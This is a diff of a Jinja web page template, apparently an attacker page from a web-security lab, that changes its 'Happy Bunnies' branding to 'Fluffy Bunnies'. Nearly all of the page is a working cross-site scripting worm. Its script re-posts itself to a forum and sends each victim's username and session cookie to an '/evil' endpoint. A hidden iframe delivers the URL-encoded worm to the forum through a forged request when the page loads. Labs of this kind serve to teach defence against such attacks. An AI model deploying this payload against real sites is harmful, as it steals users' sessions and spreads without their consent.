@@ -1,13 +1,13 @@
 {% extends "evil_base.html" %}
 {% block content %}
 <div>
-    <h1>Happy Bunnies</h1>
+    <h1>Fluffy Bunnies</h1>
     <img src="http://images4.fanpop.com/image/photos/19800000/baby-bunnies-baby-bunnies-19896692-1024-768.jpg"/>
     {# <span class="xss">
         I own you now.
         <script>
         console.log("skajdfh");
-            $.get('/forum?action=new&title=Hacked+by+Happy+Bunnies&content='+
+            $.get('/forum?action=new&title=Hacked+by+Fluffy+Bunnies&content='+
                   encodeURIComponent($(".xss")[0].outerHTML));
             $.get("/evil?save=cookie"+"&user="+encodeURIComponent($("#user-welcome strong").html())+"&cookie="+encodeURIComponent(document.cookie));
         </script>
@@ -15,9 +15,9 @@
     <br>
     <a onclick="$('#secret').show()" href="#">Show secret</a>
     <span id="secret" style="display: none;">
-        <h2> And you were hacked by Happy Bunnies</h2>
-        <iframe width="400" height="400" src="https://www.fmf.uni-lj.si"></iframe>
-        <iframe width="400" height="400" src="/forum?action=new&title=Hacked+by+Happy+Bunnies&content=%3Cspan%20class%3D%22xss%22%3E%0A%20%20I%20own%20you%20now.%0A%20%20%3Cscript%3E%0A%20%20console.log(%22skajdfh%22)%3B%0A%20%20%20%24.get('%2Fforum%3Faction%3Dnew%26title%3DHacked%2Bby%2BHappy%2BBunnies%26content%3D'%2B%0A%20%20%20%20%20encodeURIComponent(%24(%22.xss%22)%5B0%5D.outerHTML))%3B%0A%20%20%20%24.get(%22%2Fevil%3Fsave%3Dcookie%22%2B%22%26user%3D%22%2BencodeURIComponent(%24(%22%23user-welcome%20strong%22).html())%2B%22%26cookie%3D%22%2BencodeURIComponent(document.cookie))%3B%0A%20%20%3C%2Fscript%3E%0A%20%3C%2Fspan%3E"></iframe>
+        <h2> And you were hacked by Fluffy Bunnies</h2>
+        <iframe width="100%" height="500" src="https://www.fmf.uni-lj.si"></iframe>
+        <iframe width="100%" height="500" src="/forum?action=new&title=Hacked+by+Fluffy+Bunnies&content=%3Cspan%20class%3D%22xss%22%3E%0A%20%20I%20own%20you%20now.%0A%20%20%3Cscript%3E%0A%20%20console.log(%22skajdfh%22)%3B%0A%20%20%20%24.get('%2Fforum%3Faction%3Dnew%26title%3DHacked%2Bby%2BHappy%2BBunnies%26content%3D'%2B%0A%20%20%20%20%20encodeURIComponent(%24(%22.xss%22)%5B0%5D.outerHTML))%3B%0A%20%20%20%24.get(%22%2Fevil%3Fsave%3Dcookie%22%2B%22%26user%3D%22%2BencodeURIComponent(%24(%22%23user-welcome%20strong%22).html())%2B%22%26cookie%3D%22%2BencodeURIComponent(document.cookie))%3B%0A%20%20%3C%2Fscript%3E%0A%20%3C%2Fspan%3E"></iframe>
     </span>
 </div>
 {% endblock %}
